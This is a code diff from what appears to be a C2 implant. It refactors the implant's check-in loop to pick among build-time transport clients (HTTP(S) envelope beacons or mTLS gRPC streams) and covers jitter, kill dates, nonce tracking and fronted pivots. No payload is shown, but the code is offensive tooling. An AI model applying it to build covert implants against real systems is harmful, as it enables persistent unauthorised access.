@@ -99,30 +99,36 @@ internal static class ImplantApp
             CAs = serverCAs,
         };
 
-        // The check-in client follows the egress walk's URL shape
+        // The check-in clients follow the egress walk's URL shape
         // (architecture.md Sec 8): a web entry -- an http(s):// beacon URL --
         // runs the envelope POST cycle on that port; a bare host:port runs
-        // the mTLS gRPC stream. Both clients share the replay-nonce floor
-        // (Sec 9) and, through the one enroll bundle, the fronted-pivot
-        // ledger, so a run that crosses shapes keeps its accepted-nonce
-        // history and its fronted children. The loop re-selects whenever a
-        // client yields its run, so the walk's current entry always decides.
+        // the mTLS gRPC stream. Which modules exist at all is the baked
+        // transport selection -- a build compiles only the clients its walk
+        // can dial (Sec 8, the bake-time transport trim). Every client
+        // shares the replay-nonce floor (Sec 9) and, through the one enroll
+        // bundle, the fronted-pivot ledger, so a run that crosses shapes
+        // keeps its accepted-nonce history and its fronted children. The
+        // loop re-selects whenever a client yields its run, so the walk's
+        // current entry always decides.
         var nonces = new TaskNonceTracker();
-        var beacon = new Beacon(
-            config.Mode, egress, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
-            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
-            config.ClassVerbs, log, nonces);
-        var envelopeBeacon = new EnvelopeBeacon(
-            egress, enrollment.ImplantId, enrollment.Leaf, enrollment.CAs,
-            config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
-            config.ClassVerbs, log, nonces, config.Transport);
+        var setup = new CheckInSetup(config, enrollment, enroll, egress, nonces, log);
+        var clients = TransportSelection.CreateClients(setup);
         try
         {
             while (true)
             {
-                var exit = EnvelopeBeacon.IsWebBeaconUrl(egress.CurrentBeaconUrl)
-                    ? await envelopeBeacon.RunAsync(cts.Token)
-                    : await beacon.RunAsync(cts.Token);
+                var client = clients.FirstOrDefault(c => c.Serves(egress.CurrentBeaconUrl));
+                if (client is null)
+                {
+                    // The walk reached an entry whose URL shape no compiled-in
+                    // client carries (a single-shape bake walked onto the
+                    // other shape's front). Say so and stop rather than dial
+                    // the wrong client.
+                    Console.Error.WriteLine(
+                        $"rod-implant: no check-in client for beacon URL '{egress.CurrentBeaconUrl}'");
+                    return 1;
+                }
+                var exit = await client.RunAsync(cts.Token);
                 if (exit == CheckInExit.Terminate)
                     break;
             }
